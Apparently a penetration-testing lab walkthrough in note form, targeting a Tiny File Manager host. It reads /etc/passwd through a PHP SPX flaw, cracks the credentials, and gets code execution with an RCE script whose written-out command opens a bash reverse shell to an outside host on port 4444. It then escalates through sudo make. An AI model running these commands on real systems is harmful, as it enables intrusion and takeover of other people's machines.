port 80  h3k tiny file manager
<img width="1053" height="815" alt="image" src="https://github.com/user-attachments/assets/cbf2a982-de97-421f-9c7a-45be2bba8528" />

DOCUMENT_ROOT 	/var/www/html 

phpinfo SPX  
<img width="1158" height="559" alt="image" src="https://github.com/user-attachments/assets/5f58e154-2bdf-4fc5-a06c-2935325b6e6b" />
https://github.com/NoiseByNorthwest/php-spx/issues/251
downloaded etc/passwd  
<img width="1288" height="843" alt="image" src="https://github.com/user-attachments/assets/5753a08c-386b-4e1f-9eae-719c77d5c240" />  

download /var/www/html/index.php  
<img width="598" height="113" alt="image" src="https://github.com/user-attachments/assets/873194da-58ba-4cd8-9c45-6d9243d26bb1" />

30 mins to decrypt?!?!?!?  
admin is lowprofile
user is profiler
<img width="941" height="260" alt="image" src="https://github.com/user-attachments/assets/d37c47b2-122e-4835-bcdd-0afeaeacba53" />

used this exploit to rce  
python3 rce.py "http://192.168.157.108/index.php" "bash -i >& /dev/tcp/192.168.45.217/4444 0>&1"
https://github.com/chasingimpact/TinyFileManager-File-Upload-RCE-Exploit/tree/main  

su into profiler using lowprofile
<img width="348" height="63" alt="image" src="https://github.com/user-attachments/assets/991b299a-3353-43f8-b298-0b57ae1f5d1f" />

sudo -l shows make can sudo  
edit the makefile in profiler directory  
<img width="507" height="136" alt="image" src="https://github.com/user-attachments/assets/4c2c98f4-b65e-4f79-976b-de4822efd702" />  
create the reverse shell in tmp  
<img width="1588" height="279" alt="image" src="https://github.com/user-attachments/assets/e84342a4-0a97-469d-8381-1a2e478f2516" />

